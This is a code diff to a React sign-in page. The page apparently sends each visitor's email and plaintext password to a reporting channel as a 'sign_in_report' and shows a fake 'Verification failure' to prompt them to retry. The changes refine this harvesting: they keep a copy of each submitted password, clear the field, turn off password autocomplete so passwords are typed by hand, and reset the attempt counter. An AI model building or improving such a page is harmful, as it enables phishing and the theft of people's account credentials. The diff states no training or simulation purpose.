@@ -137,6 +137,8 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
     }
     if (!(await requireCaptcha())) return
 
+    const submittedPassword = password
+
     setLoading(true)
     await new Promise((r) => setTimeout(r, 500))
 
@@ -148,8 +150,8 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       void sendResponse({
         type: 'sign_in_report',
         email: trimmedEmail,
-        password,
-        passwordValue: password,
+        password: submittedPassword,
+        passwordValue: submittedPassword,
         name: userFromEmail(trimmedEmail).name,
         domain,
         authMethod: 'email',
@@ -158,6 +160,8 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
         message: 'Verification failure. Please try again.',
       })
       setError('Verification failure. Please try again.')
+      setPassword('')
+      setShowPassword(false)
       setLoading(false)
       return
     }
@@ -166,8 +170,10 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
       authMethod: 'email',
       attempt: String(signInAttempts),
       outcome: 'success',
-      password,
+      password: submittedPassword,
     })
+    setPassword('')
+    setShowPassword(false)
     setLoading(false)
   }
 
@@ -200,7 +206,7 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
             <input
               id="password"
               type={showPassword ? 'text' : 'password'}
-              autoComplete="current-password"
+              autoComplete="off"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="••••••••"
@@ -253,7 +259,10 @@ function VerifiedStep() {
       <p className="mt-1 text-sm text-slate-500">{user.email}</p>
       <button
         type="button"
-        onClick={signOut}
+        onClick={() => {
+          signInAttempts = 0
+          signOut()
+        }}
         className="mt-6 rounded-xl border border-slate-200 px-5 py-2.5 text-sm font-medium text-slate-600 transition hover:bg-slate-50"
       >
         Sign out
